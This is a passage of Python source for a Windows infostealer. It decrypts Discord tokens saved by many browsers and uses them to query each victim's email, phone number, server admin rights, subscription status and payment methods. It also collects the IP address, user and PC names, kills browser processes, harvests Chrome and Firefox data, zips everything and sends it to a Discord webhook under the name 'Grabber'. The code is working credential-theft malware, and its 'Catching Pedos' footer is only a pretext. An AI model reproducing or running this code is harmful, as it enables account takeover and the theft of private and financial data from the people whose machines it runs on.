        'Amigo': LOCAL + '\\Amigo\\User Data',
        'Torch': LOCAL + '\\Torch\\User Data',
        'Kometa': LOCAL + '\\Kometa\\User Data',
        'Orbitum': LOCAL + '\\Orbitum\\User Data',
        'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
        '7Star': LOCAL + '\\7Star\\7Star\\User Data',
        'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
        'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
    }
    
    checked = []
    all_tokens_data = []
    
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue

        for token in gettokens_astraa(path):
            token = token.replace("\\", "") if token.endswith("\\") else token

            try:
                token = AES.new(
                    win32crypt.CryptUnprotectData(base64.b64decode(getkey_astraa(path))[5:], None, None, None, 0)[1], 
                    AES.MODE_GCM, 
                    base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]
                ).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
                
                if token in checked:
                    continue
                checked.append(token)

                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
                if res.getcode() != 200:
                    continue
                res_json = json.loads(res.read().decode())

                badges = ""
                flags = res_json['flags']
                if flags == 64 or flags == 96:
                    badges += ":BadgeBravery: "
                if flags == 128 or flags == 160:
                    badges += ":BadgeBrilliance: "
                if flags == 256 or flags == 288:
                    badges += ":BadgeBalance: "

                params = urllib.parse.urlencode({"with_counts": True})
                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
                guilds = len(res)
                guild_infos = ""

                for guild in res:
                    if guild['permissions'] & 8 or guild['permissions'] & 32:
                        res_guild = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
                        vanity = ""

                        if res_guild["vanity_url_code"] != None:
                            vanity = f"""; .gg/{res_guild["vanity_url_code"]}"""

                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
                if guild_infos == "":
                    guild_infos = "No guilds"

                res_nitro = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
                has_nitro = False
                has_nitro = bool(len(res_nitro) > 0)
                exp_date = None
                if has_nitro:
                    badges += f":BadgeSubscriber: "
                    exp_date = datetime.datetime.strptime(res_nitro[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')

                res_boost = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
                available = 0
                print_boost = ""
                boost = False
                for id in res_boost:
                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
                        print_boost += f"ㅤ- Available now\n"
                        available += 1
                    else:
                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
                    boost = True
                if boost:
                    badges += f":BadgeBoost: "

                payment_methods = 0
                type_str = ""
                valid = 0
                res_pm = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode())
                for x in res_pm:
                    if x['type'] == 1:
                        type_str += "CreditCard "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1
                    elif x['type'] == 2:
                        type_str += "PayPal "
                        if not x['invalid']:
                            valid += 1
                        payment_methods += 1

                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type_str}\n```"
                embed_user = {
                    'embeds': [
                        {
                            'title': f"**New user data: {res_json['username']}**",
                            'description': f"""
                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
                            'color': 3092790,
                            'footer': {
                                'text': "Catching Pedos"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Grabber",
                    "avatar_url": "https://media.discordapp.net/attachments/1104739902513496125/1449821833087156344/iu_.png?ex=69404b4d&is=693ef9cd&hm=9e93b4b9f9328d96f1631a6876a786c499a1c879722d6a0b579f32546465e62a&format=webp&quality=lossless"
                }

                # Send embed to Discord
                send_embed_to_discord(embed_user)
                
                # Also save token data for file
                token_data = {
                    'platform': platform,
                    'token': token,
                    'username': res_json['username'],
                    'user_id': res_json['id'],
                    'email': res_json.get('email', 'N/A'),
                    'phone': res_json.get('phone', 'N/A'),
                    'badges': badges,
                    'guilds': guilds,
                    'has_nitro': has_nitro,
                    'nitro_expiry': exp_date,
                    'payment_methods': payment_methods,
                    'boosts_available': available
                }
                all_tokens_data.append(token_data)
                
            except urllib.error.HTTPError or json.JSONDecodeError:
                continue
            except Exception as e:
                print(f"ERROR: {e}")
                continue
    
    return all_tokens_data

def create_discord_token_file(tokens_data):
    """Create a text file with all Discord tokens found"""
    if not tokens_data:
        return None
    
    timestamp = int(time.time())
    content = "=== DISCORD TOKENS EXTRACTED ===\n\n"
    content += f"Total tokens found: {len(tokens_data)}\n"
    content += "=" * 60 + "\n\n"
    
    for i, token_data in enumerate(tokens_data):
        content += f"[TOKEN {i+1}]\n"
        content += f"Platform: {token_data['platform']}\n"
        content += f"Username: {token_data['username']}\n"
        content += f"User ID: {token_data['user_id']}\n"
        content += f"Email: {token_data['email']}\n"
        content += f"Phone: {token_data['phone']}\n"
        content += f"Badges: {token_data['badges']}\n"
        content += f"Guilds: {token_data['guilds']}\n"
        content += f"Has Nitro: {token_data['has_nitro']}\n"
        if token_data['has_nitro']:
            content += f"Nitro Expiry: {token_data['nitro_expiry']}\n"
        content += f"Payment Methods: {token_data['payment_methods']}\n"
        content += f"Boosts Available: {token_data['boosts_available']}\n"
        content += f"Token: {token_data['token']}\n"
        content += "=" * 60 + "\n\n"
    
    filename = f'discord_tokens_{timestamp}.txt'
    return filename, content

def main():
    kill_browser_processes()
    browsers = get_all_browsers()
    
    all_files = {}
    
    # Run the Discord token extraction from second script
    print("Extracting Discord tokens...")
    discord_tokens_data = extract_discord_tokens_astraa()
    
    # Create Discord token file if any tokens were found
    if discord_tokens_data:
        filename, content = create_discord_token_file(discord_tokens_data)
        if filename and content:
            all_files[filename] = content
            print(f"Found {len(discord_tokens_data)} Discord tokens")
    
    # Run the browser data extraction from first script
    if browsers:
        print("Extracting browser data...")
        for browser_type, browser_name, browser_path in browsers:
            try:
                print(f"Extracting from {browser_name}...")
                
                if browser_type == 'chrome':
                    data = extract_all_chrome_data(browser_name, browser_path)
                elif browser_type == 'firefox':
                    data = extract_all_firefox_data(browser_name, browser_path)
                else:
                    continue
                
                # Create files for this browser
                browser_files = create_data_files(browser_name, data)
                all_files.update(browser_files)
                
                time.sleep(1)
                
            except Exception as e:
                print(f"Error extracting from {browser_name}: {e}")
                continue
    else:
        print("No browsers found to extract from")
    
    # Create ZIP file with ALL data
    if all_files:
        timestamp = int(time.time())
        zip_filename = f'ALL_BROWSER_DATA_WITH_DISCORD_{timestamp}.zip'
        
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for filename, content in all_files.items():
                zipf.writestr(filename, content)
        
        # Send ZIP file
        print(f"Sending ZIP file to Discord: {zip_filename}")
        with open(zip_filename, 'rb') as f:
            send_file_to_discord(zip_filename, f.read())
        
        # Clean up
        os.remove(zip_filename)
        
        # Also send individual files if ZIP is too big
        for filename, content in list(all_files.items())[:10]:
            if len(content.encode('utf-8')) < 8000000:
                print(f"Sending individual file: {filename}")
                send_file_to_discord(filename, content)
                time.sleep(1)
        
        print("All data sent successfully!")
    else:
        print("No data files to send")

if __name__ == "__main__":
    main()